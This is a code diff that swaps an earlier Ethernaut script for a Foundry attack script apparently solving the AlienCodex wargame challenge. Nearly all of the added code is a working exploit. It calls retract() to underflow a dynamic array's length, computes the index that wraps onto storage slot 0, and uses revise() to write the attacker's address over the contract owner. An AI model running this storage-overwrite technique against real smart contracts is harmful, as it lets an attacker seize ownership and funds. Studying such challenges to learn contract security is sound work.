@@ -1,19 +1,41 @@
- // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
 
-import {Script} from "lib/forge-std/src/Script.sol";
-import {MagicNum} from "src/ethernaut18.sol";
+import {Script, console2} from "forge-std/Script.sol";
+import {IAlienCodex} from "../src/AlienCodexInterface.sol";
 
-contract ethernaut18Script is Script {
-    MagicNum instance =
-        MagicNum(payable(0xBfe2B6A46B4BF306922098c88Bb68AFc408BE5D8));
+contract AlienCodexAttack is Script {
+    function run() external {
+        address attacker = vm.addr(vm.envUint("PRIVATE_KEY"));
 
-    function run() public {
+        IAlienCodex target = IAlienCodex(0xf3226c377f4192CC0599055eae0A2dd9bC659E26);
+
+        // IMPORTANT: Verify the actual storage layout first.
+        uint256 arraySlot = 1;
+        uint256 ownerSlot = 0;
+
+        uint256 base = uint256(
+            keccak256(abi.encode(arraySlot))
+        );
+
+        uint256 index;
+        unchecked {
+            index = ownerSlot - base;
+        }
+
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
-        Attacker attack = new Attacker(instance);
+        target.makeContact();
+        target.retract();
+
+        target.revise(
+            index,
+            bytes32(uint256(uint160(attacker)))
+        );
 
         vm.stopBroadcast();
+
+        console2.log("Owner after attack:", target.owner());
+        console2.log("Attacker:", attacker);
     }
 }
-
